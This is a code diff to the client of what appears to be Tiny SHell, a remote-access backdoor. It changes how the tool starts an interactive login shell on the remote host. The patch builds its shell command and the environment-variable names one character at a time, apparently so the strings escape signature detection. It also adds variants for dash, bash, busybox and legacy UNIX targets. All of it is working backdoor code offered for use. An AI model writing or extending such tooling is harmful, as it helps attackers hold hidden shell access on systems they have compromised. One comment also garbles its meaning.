@@ -52,6 +52,9 @@ int main( int argc, char *argv[] )
     struct sockaddr_in client_addr;
     struct hostent *server_host;
     char action, *password;
+    char dash[5], bash[5], minimal[8];
+    char exec[18];
+    int i=0;
 
     while ((opt = getopt(argc, argv, "p:s:")) != -1) {
         switch (opt) {
@@ -244,7 +247,6 @@ connect:
     }
 
     /* howdy */
-
     switch( action )
     {
         case GET_FILE:
@@ -258,10 +260,72 @@ connect:
             break;
 
         case RUNSHELL:
+            bash[i++] = 'B'; bash[i++] = 'A';
+            bash[i++] = 'S'; bash[i++] = 'H';
+            bash[i++] = '\0'; i=0;
+
+            dash[i++] = 'D'; dash[i++] = 'A';
+            dash[i++] = 'S'; dash[i++] = 'H';
+            dash[i++] = '\0'; i=0;
+
+            minimal[i++] = 'M'; minimal[i++] = 'I';
+            minimal[i++] = 'N'; minimal[i++] = 'I';
+            minimal[i++] = 'M'; minimal[i++] = 'A';
+            minimal[i++] = 'L'; minimal[i++] = '\0';
+            i=0;
+
+            exec[i++] = 'e'; exec[i++] = 'x';
+            exec[i++] = 'e'; exec[i++] = 'c';
+            exec[i++] = ' ';
+
+            if (getenv(dash))
+            {
+                /* Debian derivatives use dash for /bin/sh and --login fails
+                 *  without this:
+                 *
+                 *  $ ./tsh 127.0.0.1
+                 *  sh: 0: Illegal option --
+                 *   $
+                 */
+                exec[i++] = 's'; exec[i++] = 'h';
+                exec[i++] = ' '; exec[i++] = '-';
+                exec[i++] = 'l';
+            }
+            else if (getenv(bash))
+            {
+                /* Might as well support Bash if dash is supported */
+                exec[i++] = 'b'; exec[i++] = 'a';
+                exec[i++] = 's'; exec[i++] = 'h';
+                exec[i++] = ' '; exec[i++] = '-';
+                exec[i++] = 'l';
+            }
+            else if (getenv(minimal))
+            {
+                /* Some embedded devices with old builds of busybox or some other
+                 * minimalist shell might support any flags to the shell at all.
+                 * Just run /bin/sh and leave it at that. You may also want to
+                 * avoid running shell init scripts for some other reason
+                 */
+                exec[i++] = 's'; exec[i++] = 'h';
+            }
+            else
+            {
+                /* The original default behavior, Bourne and Korn shells
+                 * These are traditionally found on commercial UNIX machines
+                 * Many HP-UX, IRIX, AIX and older Solaris systems do not even
+                 * have bash, or it may be in /usr/local or /opt
+                 */
+                exec[i++] = 's'; exec[i++] = 'h';
+                exec[i++] = ' '; exec[i++] = '-';
+                exec[i++] = '-'; exec[i++] = 'l';
+                exec[i++] = 'o'; exec[i++] = 'g';
+                exec[i++] = 'i'; exec[i++] = 'n';
+            }
+            exec[i] = '\0';
 
             ret = ( ( argc == 3 )
                 ? tsh_runshell( server, argv[2] )
-                : tsh_runshell( server, "exec bash --login" ) );
+                : tsh_runshell( server, exec ) );
             break;
 
         default:
